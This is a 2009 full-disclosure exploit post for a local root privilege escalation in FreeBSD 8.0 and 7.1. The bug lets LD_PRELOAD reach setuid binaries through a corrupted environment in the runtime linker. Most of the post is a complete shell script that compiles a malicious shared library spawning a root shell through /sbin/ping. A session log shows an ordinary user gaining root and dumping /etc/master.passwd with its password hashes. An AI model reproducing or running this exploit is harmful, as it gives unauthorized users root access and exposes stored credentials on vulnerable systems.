Discovered & Exploited by Nikolaos Rangos also known as Kingcope.
Nov 2009 "BiG TiME"

"Go fetch your FreeBSD r00tkitz" // http://www.youtube.com/watch?v=dDnhthI27Fg

There is an unbelievable simple local r00t bug in recent FreeBSD versions.
I audited FreeBSD for local r00t bugs a long time *sigh*. Now it pays out.

The bug resides in the Run-Time Link-Editor (rtld).
Normally rtld does not allow dangerous environment variables like LD_PRELOAD
to be set when executing setugid binaries like "ping" or "su".
With a rather simple technique rtld can be tricked into
accepting LD variables even on setugid binaries.
See the attached exploit for details.

Example exploiting session
**********************************
%uname -a;id;
FreeBSD r00tbox.Belkin 8.0-RELEASE FreeBSD 8.0-RELEASE #0: Sat Nov 21
15:48:17 UTC 2009
root@almeida.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  i386
uid=1001(kcope) gid=1001(users) groups=1001(users)
%./w00t.sh
FreeBSD local r00t zeroday
by Kingcope
November 2009
env.c: In function 'main':
env.c:5: warning: incompatible implicit declaration of built-in
function 'malloc'
env.c:9: warning: incompatible implicit declaration of built-in
function 'strcpy'
env.c:11: warning: incompatible implicit declaration of built-in
function 'execl'
/libexec/ld-elf.so.1: environment corrupt; missing value for
/libexec/ld-elf.so.1: environment corrupt; missing value for
/libexec/ld-elf.so.1: environment corrupt; missing value for
/libexec/ld-elf.so.1: environment corrupt; missing value for
/libexec/ld-elf.so.1: environment corrupt; missing value for
/libexec/ld-elf.so.1: environment corrupt; missing value for
ALEX-ALEX
# uname -a;id;
FreeBSD r00tbox.Belkin 8.0-RELEASE FreeBSD 8.0-RELEASE #0: Sat Nov 21
15:48:17 UTC 2009
root@almeida.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  i386
uid=1001(kcope) gid=1001(users) euid=0(root) groups=1001(users)
# cat /etc/master.passwd
# $FreeBSD: src/etc/master.passwd,v 1.40.22.1.2.1 2009/10/25 01:10:29
kensmith Exp $
#
root:$1$AUbbHoOs$CCCsw7hsMB14KBkeS1xlz2:0:0::0:0:Charlie &:/root:/bin/csh
toor:*:0:0::0:0:Bourne-again Superuser:/root:
daemon:*:1:1::0:0:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5::0:0:System &:/:/usr/sbin/nologin
bin:*:3:7::0:0:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533::0:0:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533::0:0:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13::0:0:Games pseudo-user:/usr/games:/usr/sbin/nologin
news:*:8:8::0:0:News Subsystem:/:/usr/sbin/nologin
man:*:9:9::0:0:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22::0:0:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25::0:0:Sendmail Submission
User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26::0:0:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53::0:0:Bind Sandbox:/:/usr/sbin/nologin
proxy:*:62:62::0:0:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64::0:0:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65::0:0:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66::0:0:UUCP
pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6::0:0:Post Office Owner:/nonexistent:/usr/sbin/nologin
www:*:80:80::0:0:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
nobody:*:65534:65534::0:0:Unprivileged user:/nonexistent:/usr/sbin/nologin
kcope:$1$u2wMkYLY$CCCuKax6dvYJrl2ZCYXA2:1001:1001::0:0:User
&:/home/kcope:/bin/sh
#

Systems tested/affected
**********************************
FreeBSD 8.0-RELEASE *** VULNERABLE
FreeBSD 7.1-RELEASE *** VULNERABLE
FreeBSD 6.3-RELEASE *** NOT VULN
FreeBSD 4.9-RELEASE *** NOT VULN

*EXPLOIT*

#!/bin/sh
echo ** FreeBSD local r00t zeroday
echo by Kingcope
echo November 2009
cat > env.c << _EOF
#include <stdio.h>

main() {
       extern char **environ;
       environ = (char**)malloc(8096);

       environ[0] = (char*)malloc(1024);
       environ[1] = (char*)malloc(1024);
       strcpy(environ[1], "LD_PRELOAD=/tmp/w00t.so.1.0");

       execl("/sbin/ping", "ping", 0);
}
_EOF
gcc env.c -o env
cat > program.c << _EOF
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
       extern char **environ;
       environ=NULL;
       system("echo ALEX-ALEX;/bin/sh");
}
_EOF
gcc -o program.o -c program.c -fPIC
gcc -shared -Wl,-soname,w00t.so.1 -o w00t.so.1.0 program.o -nostartfiles
cp w00t.so.1.0 /tmp/w00t.so.1.0
./env